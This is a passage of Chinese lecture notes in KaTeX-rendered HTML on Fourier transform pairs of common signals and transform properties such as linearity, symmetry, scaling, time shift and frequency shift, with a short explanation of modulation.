mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164054057.png" alt="image-20221002164054057"></p><h3 id="说明">说明</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164254793.png" alt="image-20221002164254793"></p><h3 id="delta傅里叶变换对"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>傅里叶变换对</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164345417.png" alt="image-20221002164345417"></p><p>​<img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164444007.png" alt="image-20221002164444007"  /><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164456092.png" alt="image-20221002164456092"  /></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164216208.png" alt="image-20221002164216208" style="zoom: 67%;" /><h2 id="常用函数的傅里叶变换">常用函数的傅里叶变换</h2><h3 id="单边指数函数">单边指数函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164632973.png" alt="image-20221002164632973"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164701474.png" alt="image-20221002164701474"></p><h3 id="双边指数函数">双边指数函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164735610.png" alt="image-20221002164735610"></p><h3 id="门函数-矩形脉冲">门函数（矩形脉冲）</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164812021.png" alt="image-20221002164812021"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164830519.png" alt="image-20221002164830519"></p><h3 id="激冲函数">激冲函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164857492.png" alt="image-20221002164857492"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002164923662.png" alt="image-20221002164923662" style="zoom: 50%;" /><h3 id="常数1">常数1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003103204963.png" alt="image-20221003103204963" style="zoom:50%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165004749.png" alt="image-20221002165004749"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165023247.png" alt="image-20221002165023247"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165042291.png" alt="image-20221002165042291"></p><h3 id="符号函数">符号函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165130771.png" alt="image-20221002165130771"></p><h3 id="阶跃函数">阶跃函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165151722.png" alt="image-20221002165151722"></p><h3 id="总结">总结</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165212664.png" alt="image-20221002165212664"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221002165233481.png" alt="image-20221002165233481" style="zoom:50%;" /><h1>傅里叶变换的性质1</h1><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121128398.png" alt="image-20221003121128398"></p><p><strong>意义</strong>：傅里叶变换具有唯一性。傅里叶变换的性质揭示了信号的时域特性和频域特性之间的内在联系。讨论傅里叶变换的性质，目的在于:了解时-频域特性的内在联系;利用性质方便求解<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">F(j\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span>;了解在通信系统领域中的应用。</p><p><strong>说明</strong>:( 1)这些性质是建立在变化对的基础上;( 2）常见变换+性质可以解决较复杂的问题。</p><h2 id="线性性质">线性性质</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121533897.png" alt="image-20221003121533897" style="zoom:50%;" /><h3 id="例1">例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121638539.png" alt="image-20221003121638539" style="zoom:50%;" /><h3 id="例2">例2</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121924720.png" alt="image-20221003121924720"></p><h2 id="奇偶性">奇偶性</h2><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121805935.png" alt="image-20221003121805935" style="zoom:50%;" /><h3 id="f-x-为实函数"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>为实函数</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003121957989.png" alt="image-20221003121957989"></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003130134540.png" alt="image-20221003130134540" style="zoom: 67%;" /><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122035776.png" alt="image-20221003122035776"></p><h4 id="总结">总结</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122325375.png" alt="image-20221003122325375" style="zoom:50%;" /><h3 id="f-x-为虚函数f-t-jg-t"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>为虚函数<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>=</mo><mi>j</mi><mi>g</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)=jg(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span></h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122053855.png" alt="image-20221003122053855"></p><h2 id="对称性">对称性</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122458266.png" alt="image-20221003122458266"></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122547264.png" alt="image-20221003122547264"></p><h3 id="例1">例1</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122712842.png" alt="image-20221003122712842"></p><h3 id="例3">例3</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122739364.png" alt="image-20221003122739364"></p><h2 id="尺度变换特性">尺度变换特性</h2><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122841087.png" alt="image-20221003122841087"></p><h3 id="0-a-1时域扩展-频带压缩">0&lt;a&lt;1时域扩展，频带压缩</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003122937891.png" alt="image-20221003122937891"></p><p><strong>0&lt;a&lt;1，脉冲持续时间增加a倍，变化慢了，信号在频域的频带压缩a倍。高频分量减少，幅度上升a倍。</strong></p><h3 id="a-1时域压缩-频带扩展">a&gt;1时域压缩，频带扩展</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123226200.png" alt="image-20221003123226200"></p><p><strong>a&gt;1，脉冲持续持续时间短，变化快了。信号在频域高频分量增加，频带展宽，各分量的幅度下降a倍。</strong></p><h2 id="delta时移特性"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>时移特性</h2><p><font color="red">原函数延迟一个量或超前一个量的变换。非常重要！<strong>线代通信理论的基础</strong>。</font></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123403128.png" alt="image-20221003123403128"></p><h3 id="例1">例1</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123450036.png" alt="image-20221003123450036" style="zoom: 67%;" /><h3 id="例2">例2</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123546865.png" alt="image-20221003123546865"></p><h3 id="例3">例3</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123605091.png" alt="image-20221003123605091"></p><h2 id="delta频移特性"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">Δ</mi></mrow><annotation encoding="application/x-tex">\Delta</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">Δ</span></span></span></span>频移特性</h2><p><font color="red">通信原理中，<strong>调制解调的基础</strong>。信号为什么能发出去？<strong>频谱搬移</strong></font></p><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003123847459.png" alt="image-20221003123847459"></p><h3 id="例2-背结果">例2（背结果）</h3><p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003124109687.png" alt="image-20221003124109687"></p><h3 id="例4">例4</h3><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221003124848336.png" alt="image-20221003124848336" style="zoom:50%;" /><p>说的一句话信号为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>，信号直接乘<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><mi>s</mi><msub><mi>ω</mi><mn>0</mn></msub><mi>t</mi></mrow><annotation encoding="application/x-tex">cos\omega_{0}t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span></span></span></span>就相当于把它的频谱搬到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mi>c</mi><mi>o</mi><mi>s</mi><mo stretchy="false">(</mo><msub><mi>ω</mi><mn>0</mn></msub><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)cos(\omega_{0}t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>上，双边谱调制发出去。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><mi>s</mi><msub><mi>ω</mi><mn>0</mn></msub><mi>t</mi></mrow><annotation encoding="application/x-tex">cos\omega_{0}t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span></span></span></span>为载波信号，相当于汽车，将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">f(t)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span></span></span></span>载着运到一个地方去，已调信号发射出去（发到收音机）。</p><p>收音机收到后，要将信号解出来就需要解调。再乘<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mi>o</mi><mi>s</mi><msub><mi>ω</mi><mn>0</mn></msub><mi>t</mi></mrow><annotation encoding="application/x-tex">cos\omega_{0}t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">t</span></span></span></span>得到音频信号。</p><h2 id="总结">总结</h2><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.</mn><mtext>线性：若</mtext><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><msub><mi>F</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><msub><mi>F</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，则</mtext><mi>a</mi><msub><mi>f</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi><msub><mi>f</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>a</mi><msub><mi>F</mi><mn>1</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mo>+</mo><mi>b</mi><msub><mi>F</mi><mn>2</mn></msub><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">1.线性：若f_{1}(t)\leftrightarrow F_{2}(j\omega),f_{2}(t)\leftrightarrow F_{2}(j\omega)，则af_{1}(t)+bf_{2}(t)\leftrightarrow aF_{1}(j\omega)+bF_{2}(j\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">若</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.</mn><mtext>奇偶性：若</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，则</mtext><mi>f</mi><mo stretchy="false">(</mo><mo>−</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>F</mi><mo stretchy="false">(</mo><mo>−</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">2.奇偶性：若f(t)\leftrightarrow F(j\omega)，则f(-t)\leftrightarrow F(-j\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord cjk_fallback">奇</span><span class="mord cjk_fallback">偶</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">若</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">则</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">↔</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord">−</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault" style="margin-right:0.03588em;">ω</span><span class="mclose">)</span></span></span></span></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3.</mn><mtext>对称性：若</mtext><mi>f</mi><mo stretchy="false">(</mo><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>ω</mi><mo stretchy="false">)</mo><mtext>，则</mtext><mi>F</mi><mo stretchy="false">(</mo><mi>j</mi><mi>t</mi><mo stretchy="false">)</mo><mo>↔</mo><mn>2</mn><mi>π</mi><mi>f</mi><mo stretchy="false">(</mo><mo>−</mo><mi>ω</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">3.对称性：若f(t)\leftrightarrow F(j\omega)，则F(jt)\leftrightarrow 2\pi f(-\omega)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mord">.</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">性</span><span class="mord 